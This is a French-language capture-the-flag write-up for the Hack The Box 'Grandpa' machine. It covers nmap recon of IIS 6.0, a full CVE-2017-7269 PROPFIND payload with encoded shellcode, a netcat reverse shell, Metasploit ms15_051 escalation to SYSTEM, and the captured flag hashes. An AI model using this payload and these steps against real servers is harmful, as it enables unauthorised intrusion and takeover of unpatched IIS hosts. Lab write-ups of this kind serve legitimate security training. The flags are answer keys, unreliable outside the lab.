## Description
Grandpa est l'une des machines les plus simples de Hack The Box, mais elle couvre la CVE-2017-7269 largement exploitée. Cette vulnérabilité est triviale à exploiter et a permis un accès immédiat à des milliers de serveurs IIS à travers le monde lorsqu'elle a été rendue publique.


## Recon
```
NSE Timing: About 97.28% done; ETC: 20:40 (0:00:00 remaining)
Nmap scan report for 10.129.95.233
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Server Date: Wed, 13 Mar 2024 01:40:52 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/6.0
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-title: Under Construction
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Voici une autre machine qui autorise les methodes PUT qui sont vraiment potentielle

alors je vais utiliser `cadaver` et mettre un fichier mais ca marche pas alors un peu de recherche sur Google je trouve https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell


```
└─# python2.7 exploit2.py 10.129.95.233 80 10.10.14.13 1337
PROPFIND / HTTP/1.1
Host: localhost
Content-Length: 1744
If: <http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇㔹呪倴呃睒偡㈲测水㉇扁㝍兡塢䝳剐㙰畄桪㍴乊硫䥶乳䱪坺潱塊㈰㝮䭉前䡣潌畖畵景癨䑍偰稶手敗畐橲穫睢癘扈攱ご汹偊呢倳㕷橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬> (Not <locktoken:write1>) <http://localhost/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓兗㡎奈捕䥱䍤摲㑨䝘煹㍫歕浈偏穆㑱潔瑃奖潯獁㑗慨穲㝅䵉坎呈䰸㙺㕲扦湃䡭㕈慷䵚慴䄳䍥割浩㙱乤渹捓此兆估硯牓材䕓穣焹体䑖漶獹桷穖慊㥅㘹氹䔱㑲卥塊䑎穄氵婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块넓栀ㅶ湯ⓣ栁ᑠ栃翾￿￿Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪䌵ᏸ栃⧧栁VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>

└─# sudo rlwrap nc -lnvp 1337                  
listening on [any] 1337 ...
connect to [10.10.14.13] from (UNKNOWN) [10.129.95.233] 1044
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>


```


## Escalation

pour les machines anciennes, j'utilise msfconsole

```

msf6 exploit(windows/local/ms15_051_client_copy_image) > set session 2
msf6 exploit(windows/local/ms15_051_client_copy_image) > set lhost tun0
lhost => 10.10.14.13
msf6 exploit(windows/local/ms15_051_client_copy_image) > run 

[*] Started reverse TCP handler on 10.10.14.13:4444 
[*] Reflectively injecting the exploit DLL and executing it...
[*] Launching netsh to host the DLL...
[+] Process 2996 launched.
[*] Reflectively injecting the DLL into 2996...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175686 bytes) to 10.129.95.233
[*] Meterpreter session 5 opened (10.10.14.13:4444 -> 10.129.95.233:1055) at 2024-03-12 21:04:33 -0500

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```


```
meterpreter > dir 'C:\Documents and Settings\Harry'
Listing: C:\Documents and Settings\Harry
========================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040555/r-xr-xr-x  0       dir   2017-04-12 09:32:03 -0500  Application Data
040777/rwxrwxrwx  0       dir   2017-04-12 09:04:02 -0500  Cookies
040777/rwxrwxrwx  0       dir   2017-04-12 09:32:31 -0500  Desktop
040555/r-xr-xr-x  0       dir   2017-04-12 09:32:04 -0500  Favorites
040777/rwxrwxrwx  0       dir   2017-04-12 08:42:54 -0500  Local Settings
040555/r-xr-xr-x  0       dir   2017-04-12 09:32:04 -0500  My Documents
100666/rw-rw-rw-  524288  fil   2017-04-12 09:32:45 -0500  NTUSER.DAT
040777/rwxrwxrwx  0       dir   2017-04-12 08:42:54 -0500  NetHood
040777/rwxrwxrwx  0       dir   2017-04-12 08:42:54 -0500  PrintHood
040555/r-xr-xr-x  0       dir   2017-04-12 09:32:04 -0500  Recent
040555/r-xr-xr-x  0       dir   2017-04-12 09:32:02 -0500  SendTo
040555/r-xr-xr-x  0       dir   2017-04-12 08:42:54 -0500  Start Menu
100666/rw-rw-rw-  0       fil   2017-04-12 08:44:12 -0500  Sti_Trace.log
040777/rwxrwxrwx  0       dir   2017-04-12 08:42:54 -0500  Templates
100666/rw-rw-rw-  1024    fil   2017-04-12 09:32:45 -0500  ntuser.dat.LOG
100666/rw-rw-rw-  178     fil   2017-04-12 09:32:45 -0500  ntuser.ini

meterpreter > dir 'C:\Documents and Settings\Harry\Desktop'
Listing: C:\Documents and Settings\Harry\Desktop
================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  32    fil   2017-04-12 09:32:26 -0500  user.txt

meterpreter > type 'C:\Documents and Settings\Harry\Desktop\user.txt'
[-] Unknown command: type
meterpreter > cat 'C:\Documents and Settings\Harry\Desktop\user.txt'
bdff5ec67c3cff017f2bedc146a5d869meterpreter > 
cat 'C:\Documents and Settings\Administrator\Desktop\root.txt'
9359e905a2c35f861f6a57cecf28bb7bmeterpreter > 
```